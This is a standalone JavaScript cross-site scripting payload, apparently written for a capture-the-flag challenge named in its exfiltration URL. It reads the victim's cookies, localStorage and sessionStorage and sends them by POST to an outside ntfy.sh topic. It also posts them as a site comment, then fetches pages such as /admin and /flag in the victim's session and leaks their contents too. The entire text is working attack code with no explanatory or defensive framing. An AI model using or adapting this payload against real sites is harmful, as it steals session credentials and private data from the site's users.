(function(){
  var topic='https://ntfy.sh/ctfcup-pokebox-Xy7Qz9';
  var d='URL='+location.href+'\nCOOKIE='+document.cookie+'\nLS='+JSON.stringify(localStorage)+'\nSS='+JSON.stringify(sessionStorage);
  var m=location.pathname.match(/\/box\/(\d+)/); var id=m?m[1]:'1';
  function send(t){
    try{ fetch(topic,{method:'POST',mode:'no-cors',body:t}); }catch(e){}
    try{ fetch('/box/'+id+'/comment',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'body='+encodeURIComponent(t).slice(0,900)}); }catch(e){}
  }
  send('HIT '+d);
  var ps=['/boxes','/settings','/admin','/flag','/u/admin','/box/1'];
  var i=0;
  function next(){
    if(i>=ps.length){ send('DONE'); return; }
    var p=ps[i++];
    fetch(p).then(function(r){return r.text().then(function(t){ send('PAGE '+p+' '+r.status+' '+t.slice(0,700)); });}).catch(function(){}).then(next);
  }
  next();
})();
